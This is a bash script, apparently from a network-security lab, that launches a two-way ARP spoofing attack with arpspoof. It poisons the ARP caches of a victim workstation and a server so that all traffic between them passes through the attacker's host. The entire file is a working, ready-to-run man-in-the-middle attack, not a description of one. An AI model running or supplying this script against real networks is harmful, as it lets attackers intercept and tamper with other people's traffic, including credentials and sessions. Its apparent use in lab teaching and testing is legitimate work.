#!/bin/bash
# =============================================================================
# arp_spoof.sh — Launch ARP spoofing attack
# Target Node: Attacker
# =============================================================================
# Usage: ./arp_spoof.sh <VICTIM_IP> <SERVER_IP>
#
# This script sends forged ARP replies to both the victim and the server,
# telling each that the Attacker's MAC address belongs to the other host.
#
# IMPORTANT: Run enable_forwarding.sh FIRST, otherwise victim loses connectivity.
# =============================================================================

VICTIM_IP="$1"
SERVER_IP="$2"

if [ -z "$VICTIM_IP" ] || [ -z "$SERVER_IP" ]; then
    echo "Usage: $0 <VICTIM_IP> <SERVER_IP>"
    echo "Example: $0 192.168.1.10 192.168.1.1"
    echo ""
    echo "  VICTIM_IP  = IP of IT-Workstation"
    echo "  SERVER_IP  = IP of IT-Server"
    exit 1
fi

IFACE="eth0"

echo "[*] Starting ARP spoofing attack..."
echo "    Interface:  $IFACE"
echo "    Victim:     $VICTIM_IP (IT-Workstation)"
echo "    Server:     $SERVER_IP (IT-Server)"
echo ""
echo "[*] Telling $VICTIM_IP that $SERVER_IP is at our MAC address..."
arpspoof -i "$IFACE" -t "$VICTIM_IP" "$SERVER_IP" &
PID1=$!

echo "[*] Telling $SERVER_IP that $VICTIM_IP is at our MAC address..."
arpspoof -i "$IFACE" -t "$SERVER_IP" "$VICTIM_IP" &
PID2=$!

echo ""
echo "[+] ARP spoofing ACTIVE (PIDs: $PID1, $PID2)"
echo "[+] All traffic between $VICTIM_IP and $SERVER_IP now flows through us."
echo ""
echo "    To stop the attack, run:"
echo "    kill $PID1 $PID2"

wait
